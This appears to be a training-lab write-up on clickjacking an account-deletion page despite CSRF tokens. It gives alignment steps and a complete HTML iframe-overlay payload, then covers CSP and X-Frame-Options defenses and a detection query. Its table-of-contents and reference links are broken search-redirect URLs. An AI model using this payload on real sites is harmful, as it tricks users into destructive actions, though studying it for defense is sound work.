# Lab Walkthrough: Basic Clickjacking with CSRF Token Protection

* **Vulnerability Type:** Clickjacking (UI Redressing)
* **Target Context:** Client-Side Execution (Account Deletion)
* **Skill Level:** Apprentice (Beginner)
* **Estimated Completion Time:** 15–20 minutes
* **Lab Status:** Solved

---

## Legal & Ethical Disclaimer

> [!WARNING]
> The methodologies, proof-of-concept (PoC) scripts, and techniques documented in this repository are strictly for educational purposes, CTF preparation, and authorized security assessments. Executing these tests against infrastructure without prior, explicit, written engagement contracts is illegal. The author disclaims all liability for misuse.

---

## Table of Contents

1. [Vulnerability Architecture & Mechanism](https://www.google.com/search?q=%25231-vulnerability-architecture--mechanism&utm_source=gemini)
2. [Lab Objectives & Verification Criteria](https://www.google.com/search?q=%25232-lab-objectives--verification-criteria&utm_source=gemini)
3. [Step-by-Step Exploitation Flow](https://www.google.com/search?q=%25233-step-by-step-exploitation-flow&utm_source=gemini)
4. [Clickjacking vs. CSRF Comparison](https://www.google.com/search?q=%25234-clickjacking-vs-csrf-comparison&utm_source=gemini)
5. [Automated Exploitation Script (HTML PoC)](https://www.google.com/search?q=%25235-automated-exploitation-script-html-poc&utm_source=gemini)
6. [Defense, Hardening & Secure Coding](https://www.google.com/search?q=%25236-defense-hardening--secure-coding&utm_source=gemini)
7. [SIEM Detection & Telemetry Analysis](https://www.google.com/search?q=%25237-siem-detection--telemetry-analysis&utm_source=gemini)
8. [Troubleshooting & Diagnostic Runbook](https://www.google.com/search?q=%25238-troubleshooting--diagnostic-runbook&utm_source=gemini)
9. [References & Standards](https://www.google.com/search?q=%25239-references--standards&utm_source=gemini)

---

## 1. Vulnerability Architecture & Mechanism

Clickjacking (User Interface Redressing) is a client-side attack that tricks a user into clicking on an invisible or disguised element on a webpage.

* **The Core Flaw:** The target application allows itself to be embedded inside an `<iframe>` on an attacker-controlled domain. The attacker overlays this iframe on top of a decoy webpage, makes the iframe completely transparent, and aligns a decoy button (e.g., "Click to win!") directly underneath a dangerous button in the hidden iframe (e.g., "Delete Account").
* **Bypassing CSRF Tokens:** Anti-CSRF tokens are completely useless against Clickjacking. Because the victim is interacting directly with the legitimate application (rendered invisibly in the iframe), the application's native scripts automatically handle and submit the valid CSRF tokens just as they would during normal use.
* **Real-World Analogy:** Imagine placing a clear sheet of glass over a legal contract. On the glass, you paint a picture of a "Free Pizza" sign with a box to sign your name. The victim signs the glass, but you've cut a hole in it so their pen strokes go straight through onto the binding contract underneath.

```text
┌────────────────────────────────────────────────────────────────────────┐
│                        CLICKJACKING Z-INDEX FLOW                       │
└────────────────────────────────────────────────────────────────────────┘

  [Z-Index 2] -> The Target Iframe (Target App: /my-account)
                 - Contains the "Delete Account" button.
                 - Opacity is set to 0.0001 (Completely invisible).
                 - Receives the actual physical mouse click.
  ────────────────────────────────────────────────────────────────────────
  [Z-Index 1] -> The Attacker Decoy Page
                 - Contains the "Click Me!" button.
                 - Opacity is set to 1.0 (Fully visible).
                 - Visually tricks the user, but receives no clicks.

```

> **Learning Checkpoint 1:** Why is the target iframe placed on a *higher* `z-index` if we want the user to see the decoy site? The browser routes mouse clicks to the top-most layer in the Z-axis. By making the top layer transparent (`opacity: 0`), the user *sees* the bottom layer but physically *clicks* the top layer.

---

## 2. Lab Objectives & Verification Criteria

* **Target Surface:** The `/my-account` page, specifically the "Delete account" button.
* **Primary Objective:** Frame the vulnerable account page and align it so a victim attempting to click a decoy element unknowingly triggers their account deletion.
* **Validation Signal:** The lab is solved when the exploit is delivered to the simulated victim and their account is deleted.

---

## 3. Step-by-Step Exploitation Flow

As an ethical hacker, precise alignment is key to successful UI redressing. Follow this systematic approach:

* **Phase 1: Baseline Testing & Framing Verification**
* Log into the target application with the provided credentials (`wiener:peter`).
* Verify the application is vulnerable to framing by opening browser developer tools and injecting `<iframe src="[https://YOUR-LAB-ID.web-security-academy.net/my-account](https://YOUR-LAB-ID.web-security-academy.net/my-account)"></iframe>`. If the page loads inside the frame without error, `X-Frame-Options` is missing.


* **Phase 2: CSS Alignment (The Calibration Phase)**
* Navigate to the **Exploit Server**.
* Construct the basic HTML structure with CSS positioning.
* **Crucial Step:** Set the iframe `opacity: 0.1` (partially visible) temporarily. This allows you to see both the decoy "Test me" text and the target "Delete account" button simultaneously.
* Adjust the `$top_value` (e.g., `300px`) and `$side_value` (e.g., `60px`) of the decoy `<div>` until the word "Test me" sits perfectly underneath the "Delete account" button in the iframe.
* Click **Store** and **View Exploit** to verify the alignment. Note: Do *not* click the button yourself during testing, or you will delete your own account and break the lab state!


* **Phase 3: Weaponization & Delivery**
* Once perfectly aligned, change the iframe opacity to `0.0001` (completely transparent).
* Change the decoy text from "Test me" to a compelling call-to-action ("Click me").
* Click **Store**, then **Deliver to victim**.



> **Learning Checkpoint 2:** Why use `opacity: 0.0001` instead of `opacity: 0` or `display: none`? Some older browsers or security mechanisms ignore or disable clicks on elements with `opacity: 0` or `display: none`. Using `0.0001` renders it mathematically invisible to the human eye but keeps it active in the browser's DOM rendering engine.

---

## 4. Clickjacking vs. CSRF Comparison

While both attacks force victims to perform unintended actions, their mechanics and defenses are entirely different.

| Feature | CSRF (Cross-Site Request Forgery) | Clickjacking (UI Redressing) |
| --- | --- | --- |
| **Execution Method** | Automated background requests (Hidden forms/JS). | Victim physically clicks a disguised button. |
| **Bypasses CSRF Tokens?** | **No.** (Tokens effectively kill CSRF). | **Yes.** (Tokens are loaded natively in the iframe). |
| **Primary Defense** | Anti-CSRF Tokens, SameSite Cookies. | `X-Frame-Options`, CSP `frame-ancestors`. |
| **Detection Visibility** | Visible in HTTP POST request logs. | Indistinguishable from legitimate user clicks. |

---

## 5. Automated Exploitation Script (HTML PoC)

This is the finalized HTML payload required to solve the lab. Replace the `YOUR-LAB-ID` placeholder with your active lab instance.

```html
<!DOCTYPE html>
<html>
<head>
    <style>
        /* The Target Application (Invisible but clickable) */
        iframe {
            position: relative;
            width: 700px;
            height: 500px;
            opacity: 0.0001; /* Transparent but active */
            z-index: 2;      /* Top layer */
        }
        
        /* The Attacker's Decoy Element (Visible but unclickable) */
        div {
            position: absolute;
            top: 450px;      /* Adjust based on screen/resolution */
            left: 60px;      /* Adjust based on screen/resolution */
            z-index: 1;      /* Bottom layer */
            font-size: 20px;
            color: red;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <!-- Decoy action -->
    <div>Click me to WIN!</div>
    
    <!-- Target framed site -->
    <iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
</body>
</html>

```

---

## 6. Defense, Hardening & Secure Coding

To prevent Clickjacking, the web server must explicitly instruct the browser *not* to allow the site to be framed by external domains.

* **Content Security Policy (CSP) - Primary Defense:**
* Implement the `frame-ancestors` directive. This obsoletes older headers and provides granular control.
* *Secure Configuration:* `Content-Security-Policy: frame-ancestors 'none';` (Blocks all framing) or `frame-ancestors 'self';` (Allows framing only on the same domain).


* **X-Frame-Options (XFO) - Legacy/Defense in Depth:**
* Supported by older browsers that may not parse CSP.
* *Secure Configuration:* `X-Frame-Options: DENY` or `X-Frame-Options: SAMEORIGIN`.


* **SameSite Cookie Attributes (Partial Defense):**
* `SameSite=Strict` session cookies will not be sent if the site is loaded in an iframe on a third-party domain, effectively rendering the framed application an unauthenticated state (preventing sensitive actions like account deletion).



> **Learning Checkpoint 3:** What is "Frame Busting" JavaScript? Historically, developers used JS to check if `top.location !== self.location` and force a redirect. This is a deprecated defense, as attackers can easily bypass it using HTML5 `iframe sandbox` attributes (e.g., `sandbox="allow-scripts allow-forms"` omitting `allow-top-navigation`). Always rely on HTTP headers instead.

---

## 7. SIEM Detection & Telemetry Analysis

Detecting clickjacking on the backend is extremely difficult because the HTTP requests generated by the victim's browser inside the iframe look identical to normal, legitimate traffic.

### HTTP Header Anomalies (Referer Checking)

* In a clickjacking attack, the `Referer` or `Sec-Fetch-Site` headers sent during the button click might reveal the attacker's domain where the iframe was hosted.
* *Note:* Attackers can suppress this by adding `<meta name="referrer" content="no-referrer">` to their exploit page, making it unreliable for absolute detection.

### Preventive Telemetry (DAST/Vulnerability Scanning)

Security teams should monitor infrastructure configurations rather than traffic logs.

```spl
# Splunk search to identify web servers missing modern framing protections
index=web_proxy sourcetype=http_headers
| search NOT "X-Frame-Options" AND NOT "Content-Security-Policy:*frame-ancestors*"
| stats count by host, uri_path

```

---

## 8. Troubleshooting & Diagnostic Runbook

| Symptom | Probable Cause | Corrective Action |
| --- | --- | --- |
| **Iframe refuses to load (Blank screen)** | Target implemented `X-Frame-Options`. | The lab environment might have reset, or you are testing a secure site. Verify headers in Burp intercept. |
| **"Click me" aligns perfectly, but nothing happens when clicked** | Z-Index mismatch. | Ensure the `iframe` has a higher `z-index` (e.g., 2) than the decoy `div` (e.g., 1). The iframe must be on top. |
| **Exploit works locally but victim lab doesn't complete** | Alignment is off for the victim's simulated browser. | Chrome/Firefox render margins slightly differently. Ensure your `top` and `left` pixel counts are close to the suggested 450px/60px (may vary per lab instance). |

---

## 9. References & Standards

* [OWASP: Clickjacking Defense Cheat Sheet](https://www.google.com/search?q=https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html&utm_source=gemini)
* [Mozilla Developer Network (MDN): Content-Security-Policy: frame-ancestors](https://www.google.com/search?q=https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors&utm_source=gemini)
* [MITRE ATT&CK: T1056.003 - Input Capture: Web Portal Capture](https://www.google.com/search?q=https://attack.mitre.org/techniques/T1056/003/&utm_source=gemini)

---

> **Key Insight:** Clickjacking leverages the victim's physical actions and authenticated browser context, rendering backend protections like CSRF tokens entirely obsolete. True defense against UI redressing happens exclusively at the browser rendering layer via `frame-ancestors` HTTP headers.
